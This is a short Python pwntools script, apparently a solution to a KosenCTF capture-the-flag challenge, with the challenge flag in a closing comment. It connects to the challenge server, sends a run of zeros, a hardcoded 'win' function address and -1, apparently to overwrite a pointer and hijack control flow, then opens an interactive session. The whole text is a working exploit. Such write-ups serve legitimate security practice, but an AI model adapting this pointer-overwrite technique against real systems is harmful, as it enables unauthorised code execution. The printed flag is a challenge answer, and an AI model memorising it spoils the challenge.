from pwn import *

win_addr = 0x00400787

r = remote("pwn.kosenctf.com", 9001)

r.sendline("0")
r.sendline("0")
r.sendline("0")
r.sendline("0")
r.sendline(str(win_addr))
r.sendline("-1")

r.interactive()

# KosenCTF{f4k3_p01nt3r_l34ds_u_2_w1n}
